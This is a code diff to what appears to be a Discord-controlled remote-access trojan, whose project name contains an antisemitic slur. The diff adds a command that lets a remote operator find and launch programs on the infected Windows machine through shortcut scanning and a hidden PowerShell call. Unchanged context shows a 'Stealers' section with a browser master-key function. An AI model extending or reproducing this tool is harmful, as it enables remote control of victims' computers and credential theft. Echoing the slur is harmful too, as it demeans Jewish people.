@@ -18,6 +18,8 @@ import datetime
 import platform
 import pymsgbox
 import requests
+import pathlib
+import difflib
 import asyncio
 import discord
 import pystray
@@ -46,7 +48,7 @@ import os
 import re
 
 TOKEN = "bot token" # Do not remove or modify this comment (easy compiler looks for this) - 23r98h
-version = "1.0.6.15" # Replace with current JewFuss-XT version (easy compiler looks for this to check for updates, so DO NOT MODIFY THIS COMMENT) - 25c75g
+version = "1.0.7.0" # Replace with current JewFuss-XT version (easy compiler looks for this to check for updates, so DO NOT MODIFY THIS COMMENT) - 25c75g
 USE_TRAY_ICON = False # Enables Tray icon allowing you to exit the bot on the desktop easily, used for testing or if used as a remote desktop tool | Default: False
 
 intents = discord.Intents.all()
@@ -984,7 +986,215 @@ async def sysinfo(ctx):
     )
 
     await ctx.send(embed=embed)
+
+def launch_app(name):
+    corrections = {
+        "peice": "peace",
+        "sider": "cider",
+        "oprah": "opera",
+        "chat gpd": "chat gpt",
+        "kick talk": "tiktok",
+        "tick talk": "tiktok",
+        "this cord": "discord"
+    }
+
+    websites = {
+        "amazon": "https://amazon.com",
+        "reddit": "https://reddit.com",
+        "tiktok": "https://tiktok.com",
+        "twitch": "https://twitch.tv",
+        "chat gpt": "https://chatgpt.com/",
+        "youtube subscriptions": "https://www.youtube.com/feed/subscriptions",
+        "youtube": "https://youtube.com",
+        "youtube.com": "https://youtube.com"
+    }
+
+    overrides = {
+        "__application": "FILEPATH"
+    }
+
+    def walk_files(dirs):
+        for d in dirs:
+            if d and os.path.isdir(d):
+                for p in pathlib.Path(d).rglob("*"):
+                    if p.is_file() and p.suffix.lower() in {".lnk", ".exe", ".bat", ".cmd", ".url", ".appref-ms"}:
+                        yield str(p)
+
+    def norm(s):
+        return "".join(ch for ch in (s or "").lower() if ch.isalnum())
+
+    def tokenize(s):
+        return [t for t in re.split(r"[^a-z0-9]+", (s or "").lower()) if t]
+
+    def per_token_match_score(qt: str, kt: str) -> float:
+        n = len(qt)
+        if n >= 4:
+            w = 1.5
+        elif n >= 3:
+            w =  1.0
+        else:
+            return 0.0
+        
+        if qt == kt:
+            ol = len(qt)
+        elif qt.startswith(kt):
+            ol = len(kt)
+        elif kt.startswith(qt):
+            ol = len(qt)
+        else:
+            return 0
     
+        frac = ol / max(len(qt), len(kt))
+        base = w * frac
+
+        bonus = 0.0
+        if ol >= 4:
+            bonus = (ol - 4) * 0.1
+
+        return base + bonus
+
+    def open_path(path, mode):
+        if os.path.exists(path):
+            subprocess.Popen(["cmd", "/c", "start", "", path], shell=False)
+        return path, mode
+
+    def startapps_fallback(query: str) -> str | None:
+        ps = r"""$q='%s'; $apps=Get-StartApps | Where-Object { $_.Name -match $q }; 
+if($apps){ $id = ($apps | Sort-Object Name | Select-Object -First 1).AppID; Start-Process ("shell:AppsFolder\"+$id); Write-Output $id }""" % query.replace("'", "''")
+
+        creation = 0
+        if hasattr(subprocess, "CREATE_NO_WINDOW"):
+            creation |= subprocess.CREATE_NO_WINDOW
+        if hasattr(subprocess, "CREATE_NEW_PROCESS_GROUP"):
+            creation |= subprocess.CREATE_NEW_PROCESS_GROUP
+
+        try:
+            out = subprocess.check_output(
+                ["powershell", "-NoProfile", "-Command", ps],
+                stderr=subprocess.STDOUT,
+                text=True,
+                timeout=5,
+                creationflags=creation
+            ).strip()
+            return out or None
+        except Exception as e:
+            print(f"startapps_fallback error: {e}")
+            return None
+
+    raw_query = (name or "").strip()
+    if not raw_query:
+        return None, 0
+    q_lower = raw_query.lower()
+
+    corrected = corrections.get(q_lower)
+    if corrected:
+        print(f"[correction] {q_lower} -> {corrected}")
+        q_lower = corrected
+        raw_query = corrected
+
+    if q_lower in websites:
+        url = websites[q_lower]
+        webbrowser.open(url)
+        return url, "website"
+
+    if q_lower in overrides:
+        path = overrides[q_lower]
+        if os.path.exists(path):
+            return open_path(path, "override")
+        else:
+            print(f"[warn] override for '{q_lower}' points to missing file: {path}")
+
+    q_tokens_all = tokenize(raw_query)
+    q_norm = norm(raw_query)
+
+    user = os.environ.get("USERPROFILE", "")
+    appdata = os.environ.get("APPDATA", "")
+    programdata = os.environ.get("PROGRAMDATA", "")
+
+    taskbar_dirs   = [os.path.join(appdata, r"Microsoft\Internet Explorer\Quick Launch\User Pinned\TaskBar")]
+    desktop_dirs   = [os.path.join(user, "Desktop"), r"C:\Users\Public\Desktop"]
+    startmenu_dirs = [
+        os.path.join(appdata,     r"Microsoft\Windows\Start Menu\Programs"),
+        os.path.join(programdata, r"Microsoft\Windows\Start Menu\Programs"),
+    ]
+
+    src_prio = {"taskbar": 3, "desktop": 2, "startmenu": 1}
+    ext_prio = {".lnk": 3, ".exe": 2, ".bat": 2, ".cmd": 2, ".url": 1, ".appref-ms": 1}
+    buckets  = [("taskbar", taskbar_dirs), ("desktop", desktop_dirs), ("startmenu", startmenu_dirs)]
+
+    candidates = {}
+    for src, dirs in buckets:
+        s_pr = src_prio[src]
+        for file in walk_files(dirs):
+            stem = pathlib.Path(file).stem.lower()
+            if stem.endswith(" - shortcut"):
+                stem = stem[:-11]
+            stem = re.sub(r"\s+", " ", stem).strip()
+            raw_name = stem
+            nkey = norm(raw_name)
+            toks_all = tokenize(raw_name)
+            e_pr = ext_prio.get(pathlib.Path(file).suffix.lower(), 0)
+            prev = candidates.get(nkey)
+            if (not prev) or (s_pr, e_pr) > (prev[1], prev[2]):
+                candidates[nkey] = (file, s_pr, e_pr, raw_name, toks_all, nkey)
+
+    if candidates:
+        if q_norm in candidates:
+            return open_path(candidates[q_norm][0], "exact")
+
+        token_hits = []
+        for _, (path, s_pr, e_pr, raw_name, toks_all, nkey) in candidates.items():
+            total = 0.0
+            matched_any = False
+            for qt in q_tokens_all:
+                best = 0.0
+                for kt in toks_all:
+                    sc = per_token_match_score(qt, kt)
+                    if sc > best:
+                        best = sc
+                if best > 0.0:
+                    matched_any = True
+                    total += best
+
+            if matched_any and total > 0.0:
+                token_hits.append((total, s_pr, e_pr, path))
+
+        if token_hits:
+            token_hits.sort(key=lambda x: (x[0], x[1], x[2]), reverse=True)
+            return open_path(token_hits[0][3], "token")
+
+        sub_hits = []
+        for _, (path, s_pr, e_pr, raw_name, _, _) in candidates.items():
+            if q_lower in raw_name:
+                sub_hits.append((s_pr, e_pr, path))
+        if sub_hits:
+            sub_hits.sort(key=lambda x: (x[0], x[1]), reverse=True)
+            return open_path(sub_hits[0][2], "substring")
+
+        fuzzy_hits = []
+        for _, (path, s_pr, e_pr, _, _, nkey) in candidates.items():
+            r = difflib.SequenceMatcher(None, nkey, q_norm).ratio()
+            if r >= 0.93:
+                fuzzy_hits.append((r, s_pr, e_pr, path))
+        if fuzzy_hits:
+            fuzzy_hits.sort(key=lambda x: (x[0], x[1], x[2]), reverse=True)
+            return open_path(fuzzy_hits[0][3], "fuzzy")
+
+    aumid = startapps_fallback(raw_query)
+    if aumid:
+        return aumid, "startapps"
+
+    print(f"[no match] '{raw_query}'")
+    return None, "not found"
+
+@bot.command(help="search various regesteries and menus for an app and open it", usage="$app <query>")
+async def app(ctx, *, query: str = ""):
+    app, mode = launch_app(query)
+    if app:
+        await ctx.send(f"Launched `{query}` via `{mode}`: `{app}`")
+    else:
+        await ctx.send(f"Could not find application matching `{query}`.")
+
 # Stealers
 
 def get_master_key(local_state_path):
@@ -2250,6 +2460,10 @@ async def estop(ctx):
         await ctx.send("You don't have permissions to do this.")
 
 try:
+    if "--version" in sys.argv:
+        print(version)
+        sys.exit(0)
+    
     bot.run(TOKEN, reconnect=True)
 except discord.errors.LoginFailure:
     exit("\n\033[91mError: Invalid bot token.\033[0m")
